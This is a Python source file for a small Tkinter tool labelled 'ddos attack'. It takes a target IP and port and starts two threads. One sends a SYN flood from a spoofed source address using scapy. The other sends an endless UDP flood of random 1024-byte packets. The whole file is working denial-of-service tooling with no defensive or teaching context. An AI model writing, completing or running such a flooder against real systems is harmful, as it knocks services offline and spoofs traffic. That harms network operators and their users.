import tkinter as tk
from scapy.all import *
import sshui
import threading
import time
import uuid
import socket
import random

def ddos_level(object,text_container):
    d_level = tk.Toplevel(object)
    d_level.title('ddos attack')
    d_level.geometry('250x100')
    ip_container = tk.Frame(master=d_level,width=300,height=80,bg='red')
    port_container = tk.Frame(master=d_level,width=300,height=80,bg='blue')
    but_container = tk.Frame(master=d_level,width=300,height=80,bg='red')
    for _ in (ip_container,port_container,but_container):
        _.pack()
    lab_ip = tk.Label(master=ip_container,text='IP:',width=5)
    ent_ip = tk.Entry(master=ip_container,width=30)
    lab_port = tk.Label(master=port_container,text='PORT:',width=5)
    ent_port = tk.Entry(master=port_container,width=30)
    but_attack = tk.Button(master=but_container,width=15,text="Attack",command=lambda :create_threads(ip=ent_ip.get(),port=ent_port.get(),text_container=text_container))
    but_cancel = tk.Button(master=but_container,width=15,text="Cancel",command=cancel)
    for _ in (lab_ip,ent_ip,lab_port,ent_port,but_attack,but_cancel):
        _.pack(side = 'left')

def create_threads(ip,port,text_container):
    port = int(port)
    global condition
    condition = 1
    threading.Thread(target=syn_attack,args=(ip,port,text_container)).start()
    threading.Thread(target=udp_attack,args=(ip,port)).start()

def syn_attack(ip,port,text_container):
    global condition
    try:
        ip = IP(src="233.233.233.233",dst=ip)
        while condition:
            for _port in range(1024,65525):
                if condition == 0:
                    break
                tcp = TCP(sport=_port,dport=port,flags='S')
                SYN_packet = ip /tcp
                send(SYN_packet)
                sshui.insert_text(text_container,f"{_port} ---------> {ip}:{port}-------{time.time()}-------{uuid.uuid4()}")
        return
    except Exception as e:
        print(e)

def udp_attack(ip,port):
    global condition
    try:
        sent_num = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while condition:
            sent_num += 1
            sock.sendto(random._urandom(1024),(ip,port))
            print(f"We have sent {sent_num} package to {ip}:{port}")
        return
    except Exception as e:
        print(e)

def cancel():
    global condition
    condition = 0